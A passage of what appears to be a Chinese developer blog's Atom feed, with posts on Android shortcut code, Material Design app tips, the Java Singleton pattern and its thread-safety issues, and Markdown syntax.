class="line"></span><br><span class="line">      <span class="comment">// 为某个包创建快捷方式</span></span><br><span class="line">      <span class="comment">// ShortcutSuperUtils.addShortcutByPackageName(this, this.getPackageName());</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeShortcutTest</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">      ShortcutUtils.removeShortcut(<span class="keyword">this</span>, getShortCutIntent(), mShortcutName);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updateShortcutTest</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">      ShortcutSuperUtils.updateShortcutIcon(<span class="keyword">this</span>, mShortcutName, getShortCutIntent(),</span><br><span class="line">              BitmapFactory.decodeResource(getResources(), com.hujiang.hj_shortcut_lib.R.mipmap.ic_launcher));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">toggleFlowEntrance</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">      FlowEntranceUtil.toggleFlowEntrance(<span class="keyword">this</span>, HJShortcutActivity.<span class="keyword">class</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> Intent <span class="title">getShortCutIntent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="comment">// 使用MAIN，可以避免部分手机(比如华为、HTC部分机型)删除应用时无法删除快捷方式的问题</span></span><br><span class="line">      Intent intent = <span class="keyword">new</span> Intent(Intent.ACTION_MAIN);</span><br><span class="line">      intent.addCategory(Intent.CATEGORY_DEFAULT);</span><br><span class="line">      intent.setClass(MainActivity.<span class="keyword">this</span>, HJShortcutActivity.<span class="keyword">class</span>);</span><br><span class="line">      <span class="keyword">return</span> intent;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>转自：<a href="http://www.jianshu.com/p/dc3d04337d00" target="_blank" rel="external">http://www.jianshu.com/p/dc3d04337d00</a></p>
]]></content>
    <summary type="html">
    <![CDATA[Android快捷方式作为Android设备的杀手锏技能，一直都是非常重要的一个功能，也正是如此，各种流氓App也不断通过快捷方式霸占着这样一个用户入口。]]>
    
    </summary>
    
      <category term="Android快捷方式" scheme="http://www.xuanzhangjiong.xyz/tags/Android%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/"/>
    
      <category term="Android" scheme="http://www.xuanzhangjiong.xyz/categories/Android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Material Design风格的应用程序开发总结]]></title>
    <link href="http://www.xuanzhangjiong.xyz/2015/11/09/Material-Design%E9%A3%8E%E6%A0%BC%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91%E6%80%BB%E7%BB%93/"/>
    <id>http://www.xuanzhangjiong.xyz/2015/11/09/Material-Design风格的应用程序开发总结/</id>
    <published>2015-11-09T11:55:39.000Z</published>
    <updated>2016-01-09T13:03:48.000Z</updated>
    <content type="html"><![CDATA[<p>我大爱 Material Design，Google 已经在这里给出了使用它的官方指导。如果你还没有看过的话，我建议你通读一下，因为它更加偏向讲述一个“好的设计”，而不是仅仅讲述如何去实现 Material Design。如果我是第一次看到，我一定会在角落那块地方或者对话框的按钮上点个大大的赞。</p>
<p>Kitkat 和 Jellybean 仍然主导着大部分市场（至少在我写这篇文章的时候），并且我们的应用还是需要支持运行着这两个版本系统的设备。Lollipop 已经出来一段时间了，我估计你也已经想到了一些办法把 Material Design 运用到你的应用上来，并且支持较老版本的系统。然后呢，这里也有一些办法，可以让你在几乎不用干任何设计活儿的情况下，使应用更加 “material”：</p>
<ol>
<li>使用 App Compat v21 的主题和控件</li>
<li>Android Asset Studio 生成的图标</li>
<li>使用免费开源库的中的组件</li>
<li>设计模式：Google Support 自带的下拉刷新（Swipe to refresh）</li>
<li>字体：Roboto</li>
</ol>
<h1 id="u4E3B_u9898_u548C_u63A7_u4EF6_uFF0C_u4F7F_u7528_App_Compat_v21"><a href="#u4E3B_u9898_u548C_u63A7_u4EF6_uFF0C_u4F7F_u7528_App_Compat_v21" class="headerlink" title="主题和控件，使用 App Compat v21"></a>主题和控件，使用 App Compat v21</h1><h2 id="u4E3B_u9898"><a href="#u4E3B_u9898" class="headerlink" title="主题"></a>主题</h2><p>Support 支持库的 V21版本已经伴随着 5.0 SDK 一起发布了。引用它便可以搞定应用“material 化”将近一半的工作。你将会得到不包含阴影的操作栏（ActionBar），并且在应用名称旁边也没有应用图标，还有由三个小圆点组成的更多（overflow）图标。菜单被放置在它们弹出的选项外边，这样当前被选中的菜单项就可以出现在所有项目或者控件等等元素的最上面。</p>
<p>新的 Support V21 包里总共有两套主题可用：暗色调（默认主题， 通过 Theme.AppCompat 来启用）和亮色调 (Theme.AppCompat.Light)</p>
<p>你的 styles.xml 现在需要这样写：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="pi">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">style</span> <span class="attribute">name</span>=<span class="value">"AppTheme"</span> <span class="attribute">parent</span>=<span class="value">"AppTheme.Base"</span>/&gt;</span><span class="css"></span><br><span class="line"></span><br><span class="line">    &lt;<span class="tag">style</span> <span class="tag">name</span>="<span class="tag">AppTheme</span><span class="class">.Base</span>" <span class="tag">parent</span>="<span class="tag">Theme</span><span class="class">.AppCompat</span>"&gt;</span><br><span class="line">        &lt;<span class="tag">item</span> <span class="tag">name</span>="<span class="tag">colorPrimary</span>"&gt;<span class="at_rule">@<span class="keyword">color/colorPrimary&lt;/item&gt;</span></span><br><span class="line">        &lt;item name=<span class="string">"colorPrimaryDark"</span>&gt;@color/colorPrimaryDark&lt;/item&gt;</span><br><span class="line">        &lt;item name=<span class="string">"colorAccent"</span>&gt;@color/colorAccent&lt;/item&gt;</span><br><span class="line">    </span></span><span class="tag">&lt;/<span class="title">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">resources</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>colorPrimary 代表 ActionBar 的颜色, colorPrimaryDark 代表状态栏（StatusBar）的颜色， colorAccent 是染色控件（tinted widgets）的颜色. 比较可惜的是，colorPrimaryDark 属性在 Lollipop 之前的版本中是不能使用的。</p>
<p>你编写的 Activity 现在必须继承 ActionBarActivity ，如果要引用 操作栏（ActionBar）你需要调用 getSupportActionBar(); 方法。如果你的应用有导航抽屉（navigation drawer），使用 getSupportActionBar().setDisplayHomeAsUpEnabled(true); 来获得。可以看到，当抽屉被打开的时候，抽屉图标会变成一个返回箭头，关闭的时候则相反。<br><img src="http://7xoz2q.com1.z0.glb.clouddn.com/material_1.gif" alt=""><br>抽屉图标变成返回箭头的时候还有一个萌萌哒的动画</p>
<h2 id="u63A7_u4EF6"><a href="#u63A7_u4EF6" class="headerlink" title="控件"></a>控件</h2><p>看到上面列表里面是不是忘了什么重要的东西？是的，按钮！</p>
<p>如何设置 App Compat library：<a href="https://developer.android.com/tools/support-library/setup.html" target="_blank" rel="external">Support Library Setup</a></p>
<h2 id="Android_Asset_Studio__u751F_u6210_u7684_u56FE_u6807"><a href="#Android_Asset_Studio__u751F_u6210_u7684_u56FE_u6807" class="headerlink" title="Android Asset Studio 生成的图标"></a>Android Asset Studio 生成的图标</h2><p>我做独立应用开发的时候从来没有错过这款工具，它包含一个图标生成器和一个点 9 图（ nine patch ）生成器。 你可以用它从你的图像或文本中生成扁平化的应用图标、action bar 图标、剪切画，或者通用图标， (Android 的系统图标除外) 。 在生成通用图标的时候你还可以指定 DPI， 但是 actionbar/tab 的图标暂时还不行，因为它都是有标准大小的 (xxhdpi, xhdpi, hdpi &amp; mdpi)。 可以看下这里：<a href="http://romannurik.github.io/AndroidAssetStudio/" target="_blank" rel="external">Android Asset Studio</a></p>
<p><img src="http://7xoz2q.com1.z0.glb.clouddn.com/material_2.jpg" alt=""></p>
<p>使用 Android Asset Studio 生成的不同 DPI 一套图标</p>
<p><img src="http://7xoz2q.com1.z0.glb.clouddn.com/material_3.jpg" alt=""></p>
<p>使用 Android Asset Studio 生成的应用程序（Launcher）图标</p>
<h1 id="u4F7F_u7528_u514D_u8D39_u5F00_u6E90_u5E93_u7684_u4E2D_u7684_u7EC4_u4EF6"><a href="#u4F7F_u7528_u514D_u8D39_u5F00_u6E90_u5E93_u7684_u4E2D_u7684_u7EC4_u4EF6" class="headerlink" title="使用免费开源库的中的组件"></a>使用免费开源库的中的组件</h1><p>不在 support 库中的一些组件，我们就得去看看其它开源库了。这里介绍一些我用过的挺棒的开源库</p>
<h2 id="BOTTOMSHEET"><a href="#BOTTOMSHEET" class="headerlink" title="BOTTOMSHEET"></a>BOTTOMSHEET</h2><p><img src="http://7xoz2q.com1.z0.glb.clouddn.com/material_4.jpg" alt=""></p>
<p>链接: <a href="https://github.com/soarcn/BottomSheet" target="_blank" rel="external">BOTTOMSHEET</a></p>
<h2 id="SNACKBAR"><a href="#SNACKBAR" class="headerlink" title="SNACKBAR"></a>SNACKBAR</h2><p><img src="http://7xoz2q.com1.z0.glb.clouddn.com/material_5.jpg" alt=""></p>
<p><img src="http://7xoz2q.com1.z0.glb.clouddn.com/material_6.jpg" alt=""><br>链接：<a href="https://github.com/nispok/snackbar" target="_blank" rel="external">SNACKBAR</a></p>
<h2 id="FLOATING_ACTION_BUTTON"><a href="#FLOATING_ACTION_BUTTON" class="headerlink" title="FLOATING ACTION BUTTON"></a>FLOATING ACTION BUTTON</h2><p><img src="http://7xoz2q.com1.z0.glb.clouddn.com/material_7.jpg" alt=""></p>
<p><img src="http://7xoz2q.com1.z0.glb.clouddn.com/material_8.jpg" alt=""></p>
<p>链接： <a href="https://github.com/futuresimple/android-floating-action-button" target="_blank" rel="external">FLOATING ACTION BUTTON</a></p>
<h1 id="u8BBE_u8BA1_u6A21_u5F0F_uFF1AGoogle_Support__u81EA_u5E26_u7684_u4E0B_u62C9_u5237_u65B0_uFF08Swipe_to_refresh_uFF09"><a href="#u8BBE_u8BA1_u6A21_u5F0F_uFF1AGoogle_Support__u81EA_u5E26_u7684_u4E0B_u62C9_u5237_u65B0_uFF08Swipe_to_refresh_uFF09" class="headerlink" title="设计模式：Google Support 自带的下拉刷新（Swipe to refresh）"></a>设计模式：Google Support 自带的下拉刷新（Swipe to refresh）</h1><p>如果你在你的 App 中用到了 Google 自带的下拉刷新，用 v4 Support 库的第 V21 版便会自动帮你添加一个 Material Design’s 的 Spinner。<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SwipeRefreshLayout swipeLayout = (SwipeRefreshLayout) findViewById(R.id.swipe_refresh_layout);</span><br><span class="line">swipeLayout.setOnRefreshListener(<span class="keyword">this</span>);</span><br><span class="line">swipeLayout.setColorSchemeResources(R.<span class="built_in">color</span>.<span class="built_in">red</span>, R.<span class="built_in">color</span>.<span class="built_in">green</span>, R.<span class="built_in">color</span>.<span class="built_in">blue</span>);</span><br></pre></td></tr></table></figure></p>
<p>布局 XML：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;android<span class="class">.support</span><span class="class">.v4</span><span class="class">.widget</span><span class="class">.SwipeRefreshLayout</span></span><br><span class="line">    xmlns:android=<span class="string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="line">    android:id=<span class="string">"@+id/swipe_refresh_layout"</span></span><br><span class="line">    android:layout_width=<span class="string">"match_parent"</span></span><br><span class="line">    android:layout_height=<span class="string">"match_parent"</span>&gt;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&lt;/android<span class="class">.support</span><span class="class">.v4</span><span class="class">.widget</span><span class="class">.SwipeRefreshLayout</span>&gt;</span><br></pre></td></tr></table></figure>
<p>颜色 colors.xml：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="pi">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">color</span> <span class="attribute">name</span>=<span class="value">"red"</span>&gt;</span>#f44336<span class="tag">&lt;/<span class="title">color</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">color</span> <span class="attribute">name</span>=<span class="value">"green"</span>&gt;</span>#4caf50<span class="tag">&lt;/<span class="title">color</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">color</span> <span class="attribute">name</span>=<span class="value">"blue"</span>&gt;</span>#03a9f4<span class="tag">&lt;/<span class="title">color</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">resources</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="http://7xoz2q.com1.z0.glb.clouddn.com/material_9.gif" alt=""></p>
<h1 id="u5B57_u4F53_uFF1ARoboto"><a href="#u5B57_u4F53_uFF1ARoboto" class="headerlink" title="字体：Roboto"></a>字体：Roboto</h1><p><img src="http://7xoz2q.com1.z0.glb.clouddn.com/material_10.jpg" alt=""></p>
<p>随着 Material Design 一起发布的 Roboto 字体<br>Roboto 也跟着新的 Material Design 一起被更新了。Google 表示这款字体已经被调整到从手表到桌面、到电视、到汽车，以至于在更多的屏幕尺寸和条件下都能正常表现。 要使用它或者任何自定义字体，把你的字体文件拖到 assets 文件夹。</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Typeface robotoRegular = Typeface.createFromAsset<span class="comment">(getAssets()</span>, <span class="string">"Roboto-Regular.ttf"</span>);</span><br><span class="line"><span class="comment">//Then set it, for example to a TextView</span></span><br><span class="line">textView.setTypeface<span class="comment">(robotoRegular)</span>;</span><br></pre></td></tr></table></figure>
<p>从<a href="http://www.google.com/design/spec/resources/roboto-noto-fonts.html" target="_blank" rel="external">此处</a>获得 Roboto。</p>
<h1 id="u52A8_u753B_u548C_u9634_u5F71_uFF08elevation_uFF09_u4E00_u89C8"><a href="#u52A8_u753B_u548C_u9634_u5F71_uFF08elevation_uFF09_u4E00_u89C8" class="headerlink" title="动画和阴影（elevation）一览"></a>动画和阴影（elevation）一览</h1><p>Lollipop 中最惊艳的应该就是动画了。拥有全新的 activity 动画（activity transitions）, 触摸时的水波纹动画（ripple animations），还有很多其它的！ 而且还有阴影（elevation）属性，使得视图（View）终于有了“深度”的概念。动画全部由一个系统级的渲染线程（RenderThread）来管理。 引用 Android Developers 博客中的原话： “RippleDrawable 能流畅运行的最大功臣就是 Android 5.0 的渲染线程（RenderThread）。直到现在才发布是因为我们一直在优化它在较老 Android 版本上运行时的表现。” 阴影（elevation）效果也是如此。但是实现这样的动画有很多方法，特别是著名的水波纹效果（Ripple effect），而且有很多开源库也可以帮到你，但是我选择在这里不讨论它们，因为我觉得如果用开源库的方式来实现就背离我的初衷了。</p>
]]></content>
    <summary type="html">
    <![CDATA[Material Design初识]]>
    
    </summary>
    
      <category term="Material Design" scheme="http://www.xuanzhangjiong.xyz/tags/Material-Design/"/>
    
      <category term="Android" scheme="http://www.xuanzhangjiong.xyz/categories/Android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[单例模式]]></title>
    <link href="http://www.xuanzhangjiong.xyz/2015/11/01/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"/>
    <id>http://www.xuanzhangjiong.xyz/2015/11/01/单例模式/</id>
    <published>2015-11-01T11:37:54.000Z</published>
    <updated>2015-12-30T12:54:54.000Z</updated>
    <content type="html"><![CDATA[<h1 id="u4E00_u3001_u5355_u4F8B_u6A21_u5F0F_u7684_u5B9A_u4E49"><a href="#u4E00_u3001_u5355_u4F8B_u6A21_u5F0F_u7684_u5B9A_u4E49" class="headerlink" title="一、单例模式的定义"></a>一、单例模式的定义</h1><p>单例模式在Web开发和Android开发中，实在是太常见了，抽空把各种单例模式都整理一遍。</p>
<p>首先，单例模式（Singleton Pattern）是一个比较简单的模式，其定义如下：</p>
<p>Ensure a class has only one instance,and provide a global point of access to it.(确保某一个类只有一个实例，而且自行实例化并向整个系统提供这个实例。)</p>
<p>Singleton类称为单例类，通过使用private的构造函数确保了在一个应用中只产生一个实例，并且是自行实例化的（在Singleton中自己使用new Singleton()。单例模式的通用源代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton singleton = <span class="keyword">new</span> Singleton();</span><br><span class="line">  <span class="comment">//限制产生多个对象</span></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//通过该方法获得实例对象</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getSingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> singleton;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//类中其他方法，尽量是static</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dosomething</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="u5355_u4F8B_u6A21_u5F0F_u7684_u5E94_u7528"><a href="#u5355_u4F8B_u6A21_u5F0F_u7684_u5E94_u7528" class="headerlink" title="单例模式的应用"></a>单例模式的应用</h1><h2 id="u5355_u4F8B_u6A21_u5F0F_u7684_u4F18_u70B9"><a href="#u5355_u4F8B_u6A21_u5F0F_u7684_u4F18_u70B9" class="headerlink" title="单例模式的优点"></a>单例模式的优点</h2><ul>
<li>由于单例模式在内存中只有一个实例，减少了内存开支，特别是一个对象需要频繁地创建、销毁时，而且创建或销毁时性能又无法优化，单例模式的优势就非常明显。</li>
<li>由于单例模式只生成一个实例，所以减少了系统的性能开销，当一个对象的产生需要比较多的资源时，如读取配置、产生其他依赖对象时，则可以通过在应用启动时直接产生一个单例对象，然后用永久驻留内存的方式来解决（在Java EE中采用单例模式时需要注意JVM垃圾回收机制）。</li>
<li>单例模式可以避免对资源的多重占用，例如一个写文件动作，由于只有一个实例存在内存中，避免对同一个资源文件的同时写操作。</li>
<li>单例模式可以在系统设置全局的访问点，优化和共享资源访问，例如可以设计一个单例类，负责所有数据表的映射处理。</li>
</ul>
<h2 id="u5355_u4F8B_u6A21_u5F0F_u7684_u7F3A_u70B9"><a href="#u5355_u4F8B_u6A21_u5F0F_u7684_u7F3A_u70B9" class="headerlink" title="单例模式的缺点"></a>单例模式的缺点</h2><ul>
<li>单例模式一般没有接口，扩展很困难，若要扩展，除了修改代码基本上没有第二种途径可以实现。单例模式为什么不能增加接口呢？因为接口对单例模式是没有任何意义的，它要求“自行实例化”，并且提供单一实例、接口或抽象类是不可能被实例化的。当然，在特殊情况下，单例模式可以实现接口、被继承等，需要在系统开发中根据环境判断。</li>
<li>单例模式对测试是不利的。在并行开发环境中，如果单例模式没有完成，是不能进行测试的，没有接口也不能使用mock的方式虚拟一个对象。</li>
<li>单例模式与单一职责原则有冲突。一个类应该只实现一个逻辑，而不关心它是否是单例的，是不是要单例取决于环境，单例模式把“要单例”和业务逻辑融合在一个类中。</li>
</ul>
<h2 id="u5355_u4F8B_u6A21_u5F0F_u7684_u4F7F_u7528_u573A_u666F"><a href="#u5355_u4F8B_u6A21_u5F0F_u7684_u4F7F_u7528_u573A_u666F" class="headerlink" title="单例模式的使用场景"></a>单例模式的使用场景</h2><p>在一个系统中，要求一个类有且仅有一个对象，如果出现多个对象就会出现“不良反应”，可以采用单例模式，具体的场景如下：</p>
<ul>
<li>要求生成唯一序列号的环境；</li>
<li>在整个项目中需要一个共享访问点或共享数据，例如一个Web页面上的计数器，可以不用把每次刷新都记录到数据库中，使用单例模式保持计数器的值，并且保证是线程安全的；</li>
<li>创建一个对象需要消耗的资源过多，如要访问IO和数据库等资源；</li>
<li>需要定义大量的静态常量和静态方法（如工具类）的环境，可以采用单例模式（当然，页可以直接声明为static的方式）。</li>
</ul>
<h2 id="u5355_u4F8B_u6A21_u5F0F_u7684_u6CE8_u610F_u4E8B_u9879"><a href="#u5355_u4F8B_u6A21_u5F0F_u7684_u6CE8_u610F_u4E8B_u9879" class="headerlink" title="单例模式的注意事项"></a>单例模式的注意事项</h2><p>首先，在高并发情况下，请注意单例模式的线程同步问题。单例模式有几种不同的实现方式，上面的例子不会出现多个实例的情况，但是下面的情况：<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Singleton</span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> Singleton singleton = <span class="keyword">null</span>;</span><br><span class="line">  <span class="comment">//限制产生多个对象</span></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//通过该方法获得实例对象</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getSingleton</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(singleton==<span class="keyword">null</span>)&#123;</span><br><span class="line">      singleton = <span class="keyword">new</span> Singleton();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> singleton;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>该单例模式在低并发的情况下尚不会出现问题，若系统压力增大，并发量增加时则可能在内存中出现多个实例，破坏了最初的预期。</p>
<p>解决线程不安全的方法有很多，可以在<code>getSingleton</code>方法前加<code>synchronized</code>关键字，也可以在<code>getSingleton</code>方法内增加<code>synchronized</code>来实现。</p>
<p>其次，需要考虑对象的复制情况。在Java中，对象默认是不可以被复制的，若实现了Cloneable接口，并实现了clone方法，则可以直接通过对象复制方式创建一个新对象，对象复制是不用调用类构造方法，因此即使是私有的构造方法，对象仍然可以被复制，在一般情况下，类复制的情况不需要考虑，很少会出现一个单例类会主动要求被复制的情况，解决该问题的最好方法就是单例类不要实现Cloneable接口。</p>
]]></content>
    <summary type="html">
    <![CDATA[单例模式在Android中应用的十分广泛，今天抽空整理一下。]]>
    
    </summary>
    
      <category term="单例模式" scheme="http://www.xuanzhangjiong.xyz/tags/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"/>
    
      <category term="设计模式" scheme="http://www.xuanzhangjiong.xyz/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[MarkDown语法练习]]></title>
    <link href="http://www.xuanzhangjiong.xyz/2015/10/10/MarkDown%E8%AF%AD%E6%B3%95%E7%BB%83%E4%B9%A0/"/>
    <id>http://www.xuanzhangjiong.xyz/2015/10/10/MarkDown语法练习/</id>
    <published>2015-10-10T08:51:41.000Z</published>
    <updated>2015-12-20T10:45:33.000Z</updated>
    <content type="html"><![CDATA[<p>写一些最简单，最实用的，下面的都是我用来写博客的。</p>
<h1 id="u5F3A_u8C03"><a href="#u5F3A_u8C03" class="headerlink" title="强调"></a>强调</h1><p>星号*与下划线_都可以，单是斜体，双是粗体，符号可跨行，符号可加空格</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">*</span>单星号是斜体<span class="keyword">*</span></span><br></pre></td></tr></table></figure>
<p><em>单星号是斜体</em></p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">*</span><span class="keyword">*</span>双星号是粗体<span class="keyword">*</span><span class="keyword">*</span></span><br></pre></td></tr></table></figure>
<p><strong>双星号是粗体</strong></p>
<h1 id="u5206_u5272_u7EBF"><a href="#u5206_u5272_u7EBF" class="headerlink" title="分割线"></a>分割线</h1><p>三个或更多_*，必须单独一行，可含空格</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">---</span></span><br></pre></td></tr></table></figure>
<hr>
<h1 id="u5F15_u7528"><a href="#u5F15_u7528" class="headerlink" title="引用"></a>引用</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">翻译成html就是<span class="tag">&lt;<span class="title">blockquote</span>&gt;</span><span class="tag">&lt;/<span class="title">blockquote</span>&gt;</span>，符号&gt;后的空格可不要</span><br><span class="line">&gt;引用</span><br></pre></td></tr></table></figure>
<blockquote>
<p>引用</p>
</blockquote>
<p>注意使用空行结束</p>
<p>内层符号前的空格必须要</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; 引用</span><br><span class="line"> <span class="prompt">&gt;&gt;</span>引用中的引用</span><br></pre></td></tr></table></figure>
<blockquote>
<p>引用</p>
<blockquote>
<p>引用中的引用</p>
</blockquote>
</blockquote>
<h1 id="u6807_u9898"><a href="#u6807_u9898" class="headerlink" title="标题"></a>标题</h1><p>Setext方式<br>三个=-或更多</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="header">大标题</span><br><span class="line">===</span></span><br></pre></td></tr></table></figure>
<h1 id="u5927_u6807_u9898"><a href="#u5927_u6807_u9898" class="headerlink" title="大标题"></a>大标题</h1><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="header">小标题</span><br><span class="line">---</span></span><br></pre></td></tr></table></figure>
<h2 id="u5C0F_u6807_u9898"><a href="#u5C0F_u6807_u9898" class="headerlink" title="小标题"></a>小标题</h2><p>标题Atx方式<br>符号#必须加空格</p>
<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># 一级标题</span></span><br><span class="line"><span class="preprocessor">## 二级标题</span></span><br><span class="line"><span class="preprocessor">### 三级标题</span></span><br><span class="line"><span class="preprocessor">#### 四级标题</span></span><br><span class="line"><span class="preprocessor">##### 五级标题</span></span><br><span class="line"><span class="preprocessor">###### 六级标题</span></span><br></pre></td></tr></table></figure>
<h1 id="u65E0_u5E8F_u5217_u8868"><a href="#u65E0_u5E8F_u5217_u8868" class="headerlink" title="无序列表"></a>无序列表</h1><p>符号之后的空格不能少，-+*效果一样，但不能混合使用，因混合是嵌套列表，内容可超长</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">+ </span>无序列表</span><br><span class="line"><span class="bullet">+ </span>无序列表</span><br><span class="line"><span class="bullet">+ </span>无序列表</span><br><span class="line"><span class="bullet">+ </span>无序列表：我很长。我也很长！那比一比啊？比就比！我有这么长，你有我长吗？我有这么这么长！好吧，你赢了！</span><br></pre></td></tr></table></figure>
<ul>
<li>无序列表</li>
<li>无序列表</li>
<li>无序列表</li>
<li>无序列表：我很长。我也很长！那比一比啊？比就比！我有这么长，你有我长吗？我有这么这么长！好吧，你赢了！</li>
</ul>
